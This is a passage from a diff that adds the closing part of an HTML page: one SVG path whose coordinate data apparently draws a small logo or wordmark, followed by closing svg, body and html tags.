+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M26.2831 21.6096V28.2496H27.7031V20.5196C27.7023 20.5204 27.6915 20.5207 27.6724 20.5214C27.4652 20.528 26.2831 20.5657 26.2831 21.6096ZM17.6331 28.2496H19.0131L19.0331 24.7796C19.0331 23.2996 18.1531 22.2596 16.6431 22.2596C16.3131 22.2596 15.9931 22.3296 15.7031 22.4696C15.4131 22.6096 15.1531 22.8096 14.9431 23.0596C14.7431 22.7996 14.4831 22.5996 14.1831 22.4596C13.8831 22.3196 13.5631 22.2496 13.2331 22.2596C11.7531 22.2596 10.8031 23.3496 10.8031 24.7796V28.2496H12.1831V24.7496C12.1731 24.6096 12.1931 24.4696 12.2431 24.3396C12.2931 24.2096 12.3631 24.0896 12.4631 23.9896C12.5631 23.8896 12.6831 23.8096 12.8131 23.7596C12.9431 23.7096 13.0831 23.6796 13.2231 23.6896C13.3531 23.6796 13.4931 23.6996 13.6231 23.7596C13.7531 23.8196 13.8731 23.8996 13.9631 23.9996C14.0631 24.0996 14.1331 24.2196 14.1731 24.3496C14.2131 24.4796 14.2331 24.6196 14.2131 24.7596V28.2496H15.5931V24.7596C15.5831 24.6196 15.6031 24.4796 15.6531 24.3496C15.7031 24.2196 15.7731 24.0996 15.8731 23.9996C15.9731 23.8996 16.0931 23.8196 16.2231 23.7696C16.3531 23.7196 16.4931 23.6996 16.6331 23.6996C16.7731 23.6996 16.9031 23.7296 17.0331 23.7796C17.1631 23.8396 17.2831 23.9196 17.3731 24.0196C17.4631 24.1196 17.5331 24.2396 17.5831 24.3696C17.6231 24.4996 17.6431 24.6396 17.6331 24.7796V28.2496ZM23.5831 26.8996C23.6631 26.8296 23.7331 26.7596 23.7931 26.6696L25.4031 26.7096C25.3031 27.0396 25.1231 27.3396 24.8731 27.5796C24.5931 27.8596 24.2531 28.0896 23.8831 28.2296C23.5131 28.3696 23.1131 28.4296 22.7131 28.4096C21.9731 28.4196 21.2631 28.1696 20.6931 27.6996C20.1131 27.2196 19.8231 26.4596 19.8231 25.3996C19.8231 24.3996 20.0831 23.6296 20.6131 23.0996C20.8831 22.8296 21.2031 22.6296 21.5531 22.4896C21.9031 22.3496 22.2831 22.2896 22.6631 22.2996C23.1331 22.2896 23.5931 22.3796 24.0131 22.5696C24.4231 22.7496 24.7631 23.0496 25.0031 23.4196C25.2431 23.7696 25.4031 24.1796 25.4631 24.5996C25.5131 24.9796 25.5231 25.3596 25.5131 25.7396H21.3331C21.3231 25.9796 21.3731 26.2096 21.4831 26.4196C21.5831 26.6296 21.7431 26.8096 21.9431 26.9396C22.1831 27.0796 22.4631 27.1496 22.7431 27.1296C23.0431 27.1596 23.3331 27.0696 23.5831 26.8996Z"></path>
+                </symbol>
+            </defs>
+        </svg></div>
+</body></html>
